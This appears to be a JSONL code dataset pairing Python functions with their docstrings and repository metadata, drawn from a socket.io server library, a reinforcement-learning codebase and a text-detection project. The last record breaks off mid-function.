{"docstring": "\"\"\"Default on_event handler.\n\nBy default, it uses decorator-based approach to handle events,\nbut you can override it to implement custom event handling.\n\n`name`\n    Event name\n`args`\n    Event args\n`kwargs`\n    Event kwargs\n\nThere's small magic around event handling.\nIf you send exactly one parameter from the client side and it is dict,\nthen you will receive parameters in dict in `kwargs`. In all other\ncases you will have `args` list.\n\nFor example, if you emit event like this on client-side::\n\n    sock.emit('test', {msg='Hello World'})\n\nyou will have following parameter values in your on_event callback::\n\n    name = 'test'\n    args = []\n    kwargs = {msg: 'Hello World'}\n\nHowever, if you emit event like this::\n\n    sock.emit('test', 'a', 'b', {msg='Hello World'})\n\nyou will have following parameter values::\n\n    name = 'test'\n    args = ['a', 'b', {msg: 'Hello World'}]\n    kwargs = {}\n\n\"\"\"\n", "func_signal": "def on_event(self, name, args=[], kwargs=dict()):\n", "code": "handler = self._events.get(name)\n\nif handler:\n    try:\n        if args:\n            return handler(self, *args)\n        else:\n            return handler(self, **kwargs)\n    except TypeError:\n        if args:\n            logger.error(('Attempted to call event handler %s ' +\n                          'with %s arguments.') % (handler,\n                                                   repr(args)))\n        else:\n            logger.error(('Attempted to call event handler %s ' +\n                          'with %s arguments.') % (handler,\n                                                   repr(kwargs)))\n        raise\nelse:\n    logger.error('Invalid event name: %s' % name)", "path": "tornadio2\\conn.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Generate disconnect packet.\n\n`endpoint`\n    Optional endpoint name\n\"\"\"\n", "func_signal": "def disconnect(endpoint=None):\n", "code": "return u'0::%s' % (\n    endpoint or ''\n    )", "path": "tornadio2\\proto.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Event implementation\n\nBecause on_event() was wrapped with ``gen.sync_engine``, yield will be treated\nas asynchronous task.\n\"\"\"\n", "func_signal": "def query(self, num):\n", "code": "response = yield gen.Task(self.long_running, num)\nself.emit('response', response)", "path": "examples\\gen\\gen.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "# Pong message back\n", "func_signal": "def on_message(self, message):\n", "code": "for p in self.participants:\n    p.send(message)", "path": "examples\\ssl_transports\\ssl_transports.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Start callbacks\"\"\"\n", "func_signal": "def start(self, timeout=None):\n", "code": "self._running = True\n\nif timeout is None:\n    timeout = self.calculate_next_run()\n\nself.io_loop.add_timeout(timeout, self._run)", "path": "tornadio2\\periodic.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Event handler decorator.\n\nCan be used with event name or will automatically use function name\nif not provided::\n\n    # Will handle 'foo' event\n    @event('foo')\n    def bar(self):\n        pass\n\n    # Will handle 'baz' event\n    @event\n    def baz(self):\n        pass\n\"\"\"\n\n", "func_signal": "def event(name_or_func):\n", "code": "if callable(name_or_func):\n    name_or_func._event_name = name_or_func.__name__\n    return name_or_func\n\ndef handler(f):\n    f._event_name = name_or_func\n    return f\n\nreturn handler", "path": "tornadio2\\conn.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Send socket.io event with acknowledgment.\n\n`callback`\n    Acknowledgment callback\n`name`\n    Name of the event\n`kwargs`\n    Optional event parameters\n\"\"\"\n", "func_signal": "def emit_ack(self, callback, name, *args, **kwargs):\n", "code": "if self.is_closed:\n    return\n\nmsg = proto.event(self.endpoint,\n                  name,\n                  self.queue_ack(callback, (name, args, kwargs)),\n                  *args,\n                  **kwargs)\nself.session.send_message(msg)", "path": "tornadio2\\conn.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Dequeue acknowledgment callback\"\"\"\n", "func_signal": "def deque_ack(self, msg_id, ack_data):\n", "code": "if msg_id in self.ack_queue:\n    time_stamp, callback, message = self.ack_queue.pop(msg_id)\n\n    callback(message, ack_data)\nelse:\n    logger.error('Received invalid msg_id for ACK: %s' % msg_id)", "path": "tornadio2\\conn.py", "repo_name": "mrjoes/tornadio2", "stars": 524, "license": "other", "language": "python", "size": 477}
{"docstring": "\"\"\"Configure environment for DeepMind-style Atari.\n\"\"\"\n", "func_signal": "def wrap_deepmind(env, clip_rewards=True, frame_stack=False, scale=False):\n", "code": "env = WarpFrame(env)\nif scale:\n    env = ScaledFloatFrame(env)\nif clip_rewards:\n    env = ClipRewardEnv(env)\nif frame_stack:\n    env = FrameStack(env, 4)\n# env = NormalizeObservation(env)\nreturn env", "path": "atari_wrappers.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"\nReturns the rank of each process on its machine\nThe processes on a given machine will be assigned ranks\n    0, 1, 2, ..., N-1,\nwhere N is the number of processes on this machine.\n\nUseful if you want to assign one gpu per machine\n\"\"\"\n", "func_signal": "def get_local_rank_size(comm):\n", "code": "this_node = platform.node()\nranks_nodes = comm.allgather((comm.Get_rank(), this_node))\nnode2rankssofar = defaultdict(int)\nlocal_rank = None\nfor (rank, node) in ranks_nodes:\n    if rank == comm.Get_rank():\n        local_rank = node2rankssofar[node]\n    node2rankssofar[node] += 1\nassert local_rank is not None\nreturn local_rank, node2rankssofar[this_node]", "path": "mpi_util.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"\nSend the root node's parameters to every worker.\nArguments:\n  sess: the TensorFlow session.\n  variables: all parameter variables including optimizer's\n\"\"\"\n", "func_signal": "def sync_from_root(sess, variables, comm=None):\n", "code": "if comm is None: comm = MPI.COMM_WORLD\nrank = comm.Get_rank()\nfor var in variables:\n    if rank == 0:\n        comm.bcast(sess.run(var))\n    else:\n        import tensorflow as tf\n        sess.run(tf.assign(var, comm.bcast(None)))", "path": "mpi_util.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"\nComputes fraction of variance that ypred explains about y.\nReturns 1 - Var[y-ypred] / Var[y]\n\ninterpretation:\n    ev=0  =>  might as well have predicted zero\n    ev=1  =>  perfect prediction\n    ev<0  =>  worse than just predicting zero\n\n\"\"\"\n", "func_signal": "def explained_variance_non_mpi(ypred,y):\n", "code": "assert y.ndim == 1 and ypred.ndim == 1\nvary = np.var(y)\nreturn np.nan if vary==0 else 1 - np.var(y-ypred)/vary", "path": "utils.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"Switches between two operations depending on a scalar value (int or bool).\nNote that both `then_expression` and `else_expression`\nshould be symbolic tensors of the *same shape*.\n\n# Arguments\n    condition: scalar tensor.\n    then_expression: TensorFlow operation.\n    else_expression: TensorFlow operation.\n\"\"\"\n", "func_signal": "def switch(condition, then_expression, else_expression):\n", "code": "x_shape = copy.copy(then_expression.get_shape())\nx = tf.cond(tf.cast(condition, 'bool'),\n            lambda: then_expression,\n            lambda: else_expression)\nx.set_shape(x_shape)\nreturn x", "path": "tf_util.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"Return only every `skip`-th frame\"\"\"\n", "func_signal": "def __init__(self, env, skip=4):\n", "code": "gym.Wrapper.__init__(self, env)\n# most recent raw observations (for max pooling across time steps)\nself._obs_buffer = np.zeros((2,)+env.observation_space.shape, dtype=np.uint8)\nself._skip       = skip", "path": "atari_wrappers.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"Initialize all the uninitialized variables in the global scope.\"\"\"\n", "func_signal": "def initialize():\n", "code": "new_variables = set(tf.global_variables()) - ALREADY_INITIALIZED\ntf.get_default_session().run(tf.variables_initializer(new_variables))\nALREADY_INITIALIZED.update(new_variables)", "path": "tf_util.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"\nComputes fraction of variance that ypred explains about y.\nReturns 1 - Var[y-ypred] / Var[y]\n\ninterpretation:\n    ev=0  =>  might as well have predicted zero\n    ev=1  =>  perfect prediction\n    ev<0  =>  worse than just predicting zero\n\n\"\"\"\n", "func_signal": "def explained_variance(ypred,y):\n", "code": "assert y.ndim == 1 and ypred.ndim == 1\nvary = mpi_var(y)\nreturn np.nan if vary==0 else 1 - mpi_var(y-ypred)/vary", "path": "utils.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"Repeat action, sum reward, and max over last observations.\"\"\"\n", "func_signal": "def step(self, action):\n", "code": "total_reward = 0.0\ndone = None\nfor i in range(self._skip):\n    obs, reward, done, info = self.env.step(action)\n    if i == self._skip - 2: self._obs_buffer[0] = obs\n    if i == self._skip - 1: self._obs_buffer[1] = obs\n    total_reward += reward\n    if done:\n        break\n# Note that the observation on the done=True frame\n# doesn't matter\nmax_frame = self._obs_buffer.max(axis=0)\n\nreturn max_frame, total_reward, done, info", "path": "atari_wrappers.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "#Does a rollout.\n", "func_signal": "def step(self):\n", "code": "t = self.I.step_count % self.nsteps\nepinfos = []\nfor l in range(self.I.nlump):\n    obs, prevrews, news, infos = self.env_get(l)\n    for env_pos_in_lump, info in enumerate(infos):\n        if 'episode' in info:\n            #Information like rooms visited is added to info on end of episode.\n            epinfos.append(info['episode'])\n            info_with_places = info['episode']\n            try:\n                info_with_places['places'] = info['episode']['visited_rooms']\n            except:\n                import ipdb; ipdb.set_trace()\n            self.I.buf_epinfos[env_pos_in_lump+l*self.I.lump_stride][t] = info_with_places\n\n    sli = slice(l * self.I.lump_stride, (l + 1) * self.I.lump_stride)\n    memsli = slice(None) if self.I.mem_state is NO_STATES else sli\n    dict_obs = self.stochpol.ensure_observation_is_dict(obs)\n    with logger.ProfileKV(\"policy_inference\"):\n        #Calls the policy and value function on current observation.\n        acs, vpreds_int, vpreds_ext, nlps, self.I.mem_state[memsli], ent = self.stochpol.call(dict_obs, news, self.I.mem_state[memsli],\n                                                                                                       update_obs_stats=self.update_ob_stats_every_step)\n    self.env_step(l, acs)\n\n    #Update buffer with transition.\n    for k in self.stochpol.ph_ob_keys:\n        self.I.buf_obs[k][sli, t] = dict_obs[k]\n    self.I.buf_news[sli, t] = news\n    self.I.buf_vpreds_int[sli, t] = vpreds_int\n    self.I.buf_vpreds_ext[sli, t] = vpreds_ext\n    self.I.buf_nlps[sli, t] = nlps\n    self.I.buf_acs[sli, t] = acs\n    self.I.buf_ent[sli, t] = ent\n\n    if t > 0:\n        self.I.buf_rews_ext[sli, t-1] = prevrews\n\nself.I.step_count += 1\nif t == self.nsteps - 1 and not self.disable_policy_update:\n    #We need to take one extra step so every transition has a reward.\n    for l in range(self.I.nlump):\n        sli = slice(l * self.I.lump_stride, (l + 1) * self.I.lump_stride)\n        memsli = slice(None) if self.I.mem_state is NO_STATES else sli\n        nextobs, rews, nextnews, _ = self.env_get(l)\n        dict_nextobs = self.stochpol.ensure_observation_is_dict(nextobs)\n        for k in self.stochpol.ph_ob_keys:\n            self.I.buf_ob_last[k][sli] = dict_nextobs[k]\n        self.I.buf_new_last[sli] = nextnews\n        with logger.ProfileKV(\"policy_inference\"):\n            _, self.I.buf_vpred_int_last[sli], self.I.buf_vpred_ext_last[sli], _, _, _ = self.stochpol.call(dict_nextobs, nextnews, self.I.mem_state[memsli], update_obs_stats=False)\n        self.I.buf_rews_ext[sli, t] = rews\n\n    #Calcuate the intrinsic rewards for the rollout.\n    fd = {}\n    fd[self.stochpol.ph_ob[None]] = np.concatenate([self.I.buf_obs[None], self.I.buf_ob_last[None][:,None]], 1)\n    fd.update({self.stochpol.ph_mean: self.stochpol.ob_rms.mean,\n               self.stochpol.ph_std: self.stochpol.ob_rms.var ** 0.5})\n    fd[self.stochpol.ph_ac] = self.I.buf_acs\n    self.I.buf_rews_int[:] = tf.get_default_session().run(self.stochpol.int_rew, fd)\n\n    if not self.update_ob_stats_every_step:\n        #Update observation normalization parameters after the rollout is completed.\n        obs_ = self.I.buf_obs[None].astype(np.float32)\n        self.stochpol.ob_rms.update(obs_.reshape((-1, *obs_.shape[2:]))[:,:,:,-1:])\n    if not self.testing:\n        update_info = self.update()\n    else:\n        update_info = {}\n    self.I.seg_init_mem_state = copy(self.I.mem_state)\n    global_i_stats = dict_gather(self.comm_log, self.I.stats, op='sum')\n    global_deque_mean = dict_gather(self.comm_log, { n : np.mean(dvs) for n,dvs in self.I.statlists.items() }, op='mean')\n    update_info.update(global_i_stats)\n    update_info.update(global_deque_mean)\n    self.global_tcount = global_i_stats['tcount']\n    for infos_ in self.I.buf_epinfos:\n        infos_.clear()\nelse:\n    update_info = {}\n\n#Some reporting logic.\nfor epinfo in epinfos:\n    if self.testing:\n        self.I.statlists['eprew_test'].append(epinfo['r'])\n        self.I.statlists['eplen_test'].append(epinfo['l'])\n    else:\n        if \"visited_rooms\" in epinfo:\n            self.local_rooms += list(epinfo[\"visited_rooms\"])\n            self.local_rooms = sorted(list(set(self.local_rooms)))\n            score_multiple = self.I.venvs[0].score_multiple\n            if score_multiple is None:\n                score_multiple = 1000\n            rounded_score = int(epinfo[\"r\"] / score_multiple) * score_multiple\n            self.scores.append(rounded_score)\n            self.scores = sorted(list(set(self.scores)))\n            self.I.statlists['eprooms'].append(len(epinfo[\"visited_rooms\"]))\n\n        self.I.statlists['eprew'].append(epinfo['r'])\n        if self.local_best_ret is None:\n            self.local_best_ret = epinfo[\"r\"]\n        elif epinfo[\"r\"] > self.local_best_ret:\n            self.local_best_ret = epinfo[\"r\"]\n\n        self.I.statlists['eplen'].append(epinfo['l'])\n        self.I.stats['epcount'] += 1\n        self.I.stats['tcount'] += epinfo['l']\n        self.I.stats['rewtotal'] += epinfo['r']\n        # self.I.stats[\"best_ext_ret\"] = self.best_ret\n\n\nreturn {'update' : update_info}", "path": "ppo_agent.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"Reference: https://en.wikipedia.org/wiki/Huber_loss\"\"\"\n", "func_signal": "def huber_loss(x, delta=1.0):\n", "code": "return tf.where(\n    tf.abs(x) < delta,\n    tf.square(x) * 0.5,\n    delta * (tf.abs(x) - 0.5 * delta)\n)", "path": "tf_util.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"\nenvs: list of gym environments to run in subprocesses\n\"\"\"\n", "func_signal": "def __init__(self, env_fns, spaces=None):\n", "code": "self.waiting = False\nself.closed = False\nnenvs = len(env_fns)\nself.remotes, self.work_remotes = zip(*[Pipe() for _ in range(nenvs)])\nself.ps = [Process(target=worker, args=(work_remote, remote, CloudpickleWrapper(env_fn)))\n    for (work_remote, remote, env_fn) in zip(self.work_remotes, self.remotes, env_fns)]\nfor p in self.ps:\n    p.daemon = True # if the main process crashes, we should not cause things to hang\n    p.start()\nfor remote in self.work_remotes:\n    remote.close()\n\nself.remotes[0].send(('get_spaces', None))\nobservation_space, action_space = self.remotes[0].recv()\nVecEnv.__init__(self, len(env_fns), observation_space, action_space)", "path": "vec_env.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "# recipe from here:\n# https://stackoverflow.com/questions/38559755/how-to-get-current-available-gpus-in-tensorflow?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa\n \n", "func_signal": "def get_available_gpus():\n", "code": "from tensorflow.python.client import device_lib\nlocal_device_protos = device_lib.list_local_devices()\nreturn [x.name for x in local_device_protos if x.device_type == 'GPU']", "path": "tf_util.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"This object ensures that common frames between the observations are only stored once.\nIt exists purely to optimize memory usage which can be huge for DQN's 1M frames replay\nbuffers.\n\nThis object should only be converted to numpy array before being passed to the model.\n\nYou'd not believe how complex the previous solution was.\"\"\"\n", "func_signal": "def __init__(self, frames):\n", "code": "self._frames = frames\nself._out = None", "path": "atari_wrappers.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"Returns a session that will use <num_cpu> CPU's only\"\"\"\n", "func_signal": "def make_session(num_cpu=None, make_default=False, graph=None):\n", "code": "if num_cpu is None:\n    num_cpu = int(os.getenv('RCALL_NUM_CPU', multiprocessing.cpu_count()))\ntf_config = tf.ConfigProto(\n    inter_op_parallelism_threads=num_cpu,\n    intra_op_parallelism_threads=num_cpu)\nif make_default:\n    return tf.InteractiveSession(config=tf_config, graph=graph)\nelse:\n    return tf.Session(config=tf_config, graph=graph)", "path": "tf_util.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"Warp frames to 84x84 as done in the Nature paper and later work.\"\"\"\n", "func_signal": "def __init__(self, env):\n", "code": "gym.ObservationWrapper.__init__(self, env)\nself.width = 84\nself.height = 84\nself.observation_space = spaces.Box(low=0, high=255,\n    shape=(self.height, self.width, 1), dtype=np.uint8)", "path": "atari_wrappers.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"\nReset all environments\n\"\"\"\n", "func_signal": "def reset(self):\n", "code": "obs = self.venv.reset()\nself.stackedobs[...] = 0\nself.stackedobs[..., -obs.shape[-1]:] = obs\nreturn self.stackedobs", "path": "vec_env.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"Just like Theano function. Take a bunch of tensorflow placeholders and expressions\ncomputed based on those placeholders and produces f(inputs) -> outputs. Function f takes\nvalues to be fed to the input's placeholders and produces the values of the expressions\nin outputs.\n\nInput values can be passed in the same order as inputs or can be provided as kwargs based\non placeholder name (passed to constructor or accessible via placeholder.op.name).\n\nExample:\n    x = tf.placeholder(tf.int32, (), name=\"x\")\n    y = tf.placeholder(tf.int32, (), name=\"y\")\n    z = 3 * x + 2 * y\n    lin = function([x, y], z, givens={y: 0})\n\n    with single_threaded_session():\n        initialize()\n\n        assert lin(2) == 6\n        assert lin(x=3) == 9\n        assert lin(2, 2) == 10\n        assert lin(x=2, y=3) == 12\n\nParameters\n----------\ninputs: [tf.placeholder, tf.constant, or object with make_feed_dict method]\n    list of input arguments\noutputs: [tf.Variable] or tf.Variable\n    list of outputs or a single output to be returned from function. Returned\n    value will also have the same shape.\n\"\"\"\n", "func_signal": "def function(inputs, outputs, updates=None, givens=None):\n", "code": "if isinstance(outputs, list):\n    return _Function(inputs, outputs, updates, givens=givens)\nelif isinstance(outputs, (dict, collections.OrderedDict)):\n    f = _Function(inputs, outputs.values(), updates, givens=givens)\n    return lambda *args, **kwargs: type(outputs)(zip(outputs.keys(), f(*args, **kwargs)))\nelse:\n    f = _Function(inputs, [outputs], updates, givens=givens)\n    return lambda *args, **kwargs: f(*args, **kwargs)[0]", "path": "tf_util.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "\"\"\"\nCopies the file from rank 0 to all other ranks\nPuts it in the same place on all machines\n\"\"\"\n", "func_signal": "def share_file(comm, path):\n", "code": "localrank, _ = get_local_rank_size(comm)\nif comm.Get_rank() == 0:\n    with open(path, 'rb') as fh:\n        data = fh.read()\n    comm.bcast(data)\nelse:\n    data = comm.bcast(None)\n    if localrank == 0:\n        os.makedirs(os.path.dirname(path), exist_ok=True)\n        with open(path, 'wb') as fh:\n            fh.write(data)\ncomm.Barrier()", "path": "mpi_util.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "#lasagne ortho init for tf\n", "func_signal": "def _ortho_init(shape, dtype, partition_info=None):\n", "code": "shape = tuple(shape)\nif len(shape) == 2:\n    flat_shape = shape\nelif len(shape) == 4: # assumes NHWC\n    flat_shape = (np.prod(shape[:-1]), shape[-1])\nelse:\n    raise NotImplementedError\na = np.random.normal(0.0, 1.0, flat_shape)\nu, _, v = np.linalg.svd(a, full_matrices=False)\nq = u if u.shape == flat_shape else v # pick the one with the correct shape\nq = q.reshape(shape)\nreturn (scale * q[:shape[0], :shape[1]]).astype(np.float32)", "path": "utils.py", "repo_name": "openai/random-network-distillation", "stars": 812, "license": "None", "language": "python", "size": 52}
{"docstring": "# line1 0= ax+by+c, compute the cross point of line1 and line2\n", "func_signal": "def line_cross_point(line1, line2):\n", "code": "if line1[0] != 0 and line1[0] == line2[0]:\n    print('Cross point does not exist')\n    return None\nif line1[0] == 0 and line2[0] == 0:\n    print('Cross point does not exist')\n    return None\nif line1[1] == 0:\n    x = -line1[2]\n    y = line2[0] * x + line2[2]\nelif line2[1] == 0:\n    x = -line2[2]\n    y = line1[0] * x + line1[2]\nelse:\n    k1, _, b1 = line1\n    k2, _, b2 = line2\n    x = -(b1-b2)/(k1-k2)\n    y = k1*x + b1\nreturn np.array([x, y], dtype=np.float32)", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "\"\"\"\nargs \nimg -- \n\"\"\"\n", "func_signal": "def transform_for_train(img):\n", "code": "h, w, c = img.shape\nassert h == 512, 'img should be 512'\nassert w == 512, 'img should be 512'\nassert c == 3  , 'img should be 3 channels'\n# cv2 trans to pil\nimage = Image.fromarray(np.uint8(img))\n\ntransform_list = []\n\ntransform_list.append(transforms.ColorJitter(0.5, 0.5, 0.5, 0.25))\n\ntransform_list.append(transforms.ToTensor())\n\ntransform_list.append(transforms.Normalize(mean=(0.5,0.5,0.5),std=(0.5,0.5,0.5)))\n\ntransform = transforms.Compose(transform_list)\n\ntransforms.Compose(transform_list)\nreturn transform(image)", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "'''\ncheck so that the text poly is in the same direction,\nand also filter some invalid polygons\n:param polys:\n:param tags:\n:return:\n'''\n\n", "func_signal": "def check_and_validate_polys(polys, tags, xxx_todo_changeme):\n", "code": "(h, w) = xxx_todo_changeme\nif polys.shape[0] == 0:\n    return polys\npolys[:, :, 0] = np.clip(polys[:, :, 0], 0, w-1)\npolys[:, :, 1] = np.clip(polys[:, :, 1], 0, h-1)\n\nvalidated_polys = []\nvalidated_tags = []\n\n# find top-left and clockwise\npolys = choose_best_begin_point(polys)\n\nfor poly, tag in zip(polys, tags):\n    p_area = polygon_area(poly)\n    if abs(p_area) < 1:\n        # print poly\n        #print('invalid poly')\n        continue\n    if p_area > 0:\n        #print('poly in wrong direction')\n        poly = poly[(0, 3, 2, 1), :]\n    validated_polys.append(poly)\n    validated_tags.append(tag)\nreturn np.array(validated_polys), np.array(validated_tags)", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "'''\nmake random crop from the input image\n:param im:\n:param polys:\n:param tags:\n:param crop_background:\n:param max_tries:\n:return:\n'''\n", "func_signal": "def crop_area(im, polys, tags, crop_background=False, max_tries=5000, vis = False, img_name = None):\n", "code": "h, w, _ = im.shape\npad_h = h//10\npad_w = w//10\nh_array = np.zeros((h + pad_h*2), dtype=np.int32)\nw_array = np.zeros((w + pad_w*2), dtype=np.int32)\n\nif polys.shape[0] == 0:\n    return im, [], []\n\nfor poly in polys:\n    poly = np.round(poly, decimals=0).astype(np.int32)\n    minx = np.min(poly[:, 0])\n    maxx = np.max(poly[:, 0])\n    w_array[minx+pad_w:maxx+pad_w] = 1\n    miny = np.min(poly[:, 1])\n    maxy = np.max(poly[:, 1])\n    h_array[miny+pad_h:maxy+pad_h] = 1\n\n# ensure the cropped area not across a text\nh_axis = np.where(h_array == 0)[0]\nw_axis = np.where(w_array == 0)[0]\n\nif len(h_axis) == 0 or len(w_axis) == 0:\n    return im, polys, tags\n\nfor i in range(max_tries):\n    #print('we have try {} times'.format(i))\n    xx = np.random.choice(w_axis, size=2)\n    xmin = np.min(xx) - pad_w\n    xmax = np.max(xx) - pad_w\n    xmin = np.clip(xmin, 0, w-1)\n    xmax = np.clip(xmax, 0, w-1)\n    yy = np.random.choice(h_axis, size=2)\n    ymin = np.min(yy) - pad_h\n    ymax = np.max(yy) - pad_h\n    ymin = np.clip(ymin, 0, h-1)\n    ymax = np.clip(ymax, 0, h-1)\n    # if xmax - xmin < FLAGS.min_crop_side_ratio*w or ymax - ymin < FLAGS.min_crop_side_ratio*h:\n    if xmax - xmin < 0.1*w or ymax - ymin < 0.1*h:\n        # area too small\n        continue\n    if polys.shape[0] != 0:\n        poly_axis_in_area = (polys[:, :, 0] >= xmin) & (polys[:, :, 0] <= xmax) \\\n                            & (polys[:, :, 1] >= ymin) & (polys[:, :, 1] <= ymax)\n        selected_polys = np.where(np.sum(poly_axis_in_area, axis=1) == 4)[0]\n    else:\n        selected_polys = []\n\n    if len(selected_polys) == 0:\n        # no text in this area\n        if crop_background == True:\n            im = im[ymin:ymax+1, xmin:xmax+1, :]\n            polys = []\n            tags = []\n\n            return im, polys, tags\n        else:\n            continue\n    else:\n        if crop_background == False:\n            im = im[ymin:ymax+1, xmin:xmax+1, :]\n            polys = polys.tolist()\n            polys = [polys[i] for i in selected_polys]\n            polys = np.array(polys)\n            polys[:, :, 0] -= xmin #ndarray\n            polys[:, :, 1] -= ymin\n            polys = polys.astype(np.int32)\n            polys = polys.tolist()\n\n            tags  = tags.tolist()\n            tags  = [tags[i]  for i in selected_polys]\n            return im, polys, tags\n        else:\n            continue\nreturn im, polys, tags", "path": "data_utils.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "'''\nrestore text boxes from score map and geo map\n:param score_map:\n:param geo_map:\n:param timer:\n:param score_map_thresh: threshhold for score map\n:param box_thresh: threshhold for boxes\n:param nms_thres: threshold for nms\n:return:\n'''\n", "func_signal": "def detect(score_map, geo_map, timer, score_map_thresh=1e-5, box_thresh=1e-8, nms_thres=0.1):\n", "code": "if len(score_map.shape) == 4:\n    score_map = score_map[0, :, :, 0]\n    geo_map = geo_map[0, :, :, ]\n# filter the score map\nxy_text = np.argwhere(score_map > score_map_thresh)\n# sort the text boxes via the y axis\nxy_text = xy_text[np.argsort(xy_text[:, 0])]\n# restore\nstart = time.time()\ntext_box_restored = restore_rectangle(xy_text[:, ::-1]*4, geo_map[xy_text[:, 0], xy_text[:, 1], :]) # N*4*2\n#print('{} text boxes before nms'.format(text_box_restored.shape[0]))\nboxes = np.zeros((text_box_restored.shape[0], 9), dtype=np.float32)\nboxes[:, :8] = text_box_restored.reshape((-1, 8))\nboxes[:, 8] = score_map[xy_text[:, 0], xy_text[:, 1]]\ntimer['restore'] = time.time() - start\n# nms part\nstart = time.time()\n# boxes = nms_locality.nms_locality(boxes.astype(np.float64), nms_thres)\nboxes = lanms.merge_quadrangle_n9(boxes.astype('float32'), nms_thres)\ntimer['nms'] = time.time() - start\nif boxes.shape[0] == 0:\n    return None, timer\n\n# here we filter some low score boxes by the average score map, this is different from the orginal paper\nfor i, box in enumerate(boxes):\n    mask = np.zeros_like(score_map, dtype=np.uint8)\n    cv2.fillPoly(mask, box[:8].reshape((-1, 4, 2)).astype(np.int32) // 4, 1)\n    boxes[i, 8] = cv2.mean(score_map, mask)[0]\nboxes = boxes[boxes[:, 8] > box_thresh]\nreturn boxes, timer", "path": "eval.py", "repo_name": "songdejia/EAST", "stars": 554, "license": "mit", "language": "python", "size": 8531}
{"docstring": "'''\nfit a poly inside the origin poly, maybe bugs here...\nused for generate the score map\n:param poly: the text poly\n:param r: r in the paper\n:return: the shrinked poly\n'''\n# shrink ratio\n", "func_signal": "def shrink_poly(poly, r):\n", "code": "R = 0.3\n# find the longer pair\nif np.linalg.norm(poly[0] - poly[1]) + np.linalg.norm(poly[2] - poly[3]) > \\\n                np.linalg.norm(poly[0] - poly[3]) + np.linalg.norm(poly[1] - poly[2]):\n    # first move (p0, p1), (p2, p3), then (p0, p3), (p1, p2)\n    ## p0, p1\n    theta = np.arctan2((poly[1][1] - poly[0][1]), (poly[1][0] - poly[0][0]))\n    poly[0][0] += R * r[0] * np.cos(theta)\n    poly[0][1] += R * r[0] * np.sin(theta)\n    poly[1][0] -= R * r[1] * np.cos(theta)\n    poly[1][1] -= R * r[1] * np.sin(theta)\n    ## p2, p3\n    theta = np.arctan2((poly[2][1] - poly[3][1]), (poly[2][0] - poly[3][0]))\n    poly[3][0] += R * r[3] * np.cos(theta)\n    poly[3][1] += R * r[3] * np.sin(theta)\n    poly[2][0] -= R * r[2] * np.cos(theta)\n    poly[2][1] -= R * r[2] * np.sin(theta)\n    ## p0, p3\n    theta = np.arctan2((poly[3][0] - poly[0][0]), (poly[3][1] - poly[0][1]))\n    poly[0][0] += R * r[0] * np.sin(theta)\n    poly[0][1] += R * r[0] * np.cos(theta)\n    poly[3][0] -= R * r[3] * np.sin(theta)\n    poly[3][1] -= R * r[3] * np.cos(theta)\n    ## p1, p2\n    theta = np.arctan2((poly[2][0] - poly[1][0]), (poly[2][1] - poly[1][1]))\n    poly[1][0] += R * r[1] * np.sin(theta)\n    poly[1][1] += R * r[1] * np.cos(theta)\n    poly[2][0] -= R * r[2] * np.sin(theta)\n    poly[2][1] -= R * r[2] * np.cos(theta)\nelse:\n    ## p0, p3\n    # print poly\n    theta = np.arctan2((poly[3][0] - poly[0][0]), (poly[3][1] - poly[0][1]))\n    